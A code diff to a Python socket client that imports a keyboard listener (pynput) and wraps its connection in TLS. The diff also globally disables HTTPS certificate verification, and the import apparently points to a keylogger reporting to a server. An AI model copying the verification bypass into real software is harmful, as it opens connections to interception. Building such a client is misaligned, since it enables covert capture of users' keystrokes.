@@ -6,9 +6,18 @@ import selectors
 from threading import Thread
 from pynput.keyboard import Listener
 import traceback
+import ssl
 # package with Message class
 import lib_client
 
+try:
+    _create_unverified_https_context = ssl._create_unverified_context
+except AttributeError:
+    #Legacy Python that doesn't verify HTTPS certificates by default
+    pass
+else:
+    # Handle target environment that doesn't support HTTPS verification
+    ssl._create_default_https_context = _create_unverified_https_context
 
 sel = selectors.DefaultSelector()
 
@@ -48,11 +57,22 @@ def start_connection(host: str, port: int, mode: str):
     addr = (host, port)
     print("starting connection to", addr)
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.setblocking(False)
+    # sock.setblocking(False)
     sock.connect_ex(addr)
+
+    # ctx = ssl.create_default_context()
+    # ctx.verify_mode = ssl.CERT_REQUIRED
+    # ctx.check_hostname = True
+    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    ctx.load_verify_locations("certs/CA.pem")
+    # ctx.load_cert_chain('certs/server.pem', 'certs/server.key')
+
+    sslsoc = ctx.wrap_socket(sock, server_hostname=f'{host}:{port}')
+
+
     events = selectors.EVENT_READ | selectors.EVENT_WRITE
-    message = lib_client.Message(sel, sock, addr, mode)
-    sel.register(sock, events, data=message)
+    message = lib_client.Message(sel, sslsoc, addr, mode)
+    sel.register(sslsoc, events, data=message)
 
 
 if len(sys.argv) != 4:
